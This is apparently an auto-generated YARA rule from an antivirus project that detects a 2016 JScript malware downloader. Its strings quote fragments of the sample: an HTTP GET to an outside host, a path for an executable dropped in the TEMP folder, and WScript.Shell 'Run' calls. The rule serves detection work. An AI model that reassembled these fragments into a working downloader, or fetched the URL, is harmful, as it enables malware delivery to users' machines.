rule sig_20160329_4afef7bc1f0befa09d262a805e53e4bd {
  meta:
    description = "datamaliciousorder - file 20160329_4afef7bc1f0befa09d262a805e53e4bd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d0df61f7dae7e406380f106b3516b4286f1f0e07de23762974f5fa1000a7ad90"

  strings:
    $s1  = "R[Xx](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function Vx() {return Qz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"95S3iHKU3.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[w](Lc() * 11); if (R[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function nY(Nm, e){N = N * 1; return Nm - e;};" fullword ascii
    $s5  = "var Qz = function ck() {return WScript[r](\"WScript.Shell\");}(), Yy = 11;" fullword ascii
    $s6  = "function B(){return \"\" + d;};" fullword ascii
    $s7  = "function bA() {return ((K == true) && (K == Kp)) ? 1 : N;};" fullword ascii
    $s8  = "function FG(Gm){Qz[\"Run\"](Gm, N, N);};" fullword ascii
    $s9  = "var M0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function Rl(){return r;};" fullword ascii
    $s11 = "function pA()" fullword ascii
    $s12 = "function Lc(){return 22;};" fullword ascii
    $s13 = "function qX(v) {var lK = (1, 2, 3, 4, 5, v); return lK;};" fullword ascii
    $s14 = " while (OT){" fullword ascii
    $s15 = "return nY(l, Hr);" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var J = false;" fullword ascii
    $s19 = "Kp = true; " fullword ascii
    $s20 = "var Kp = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}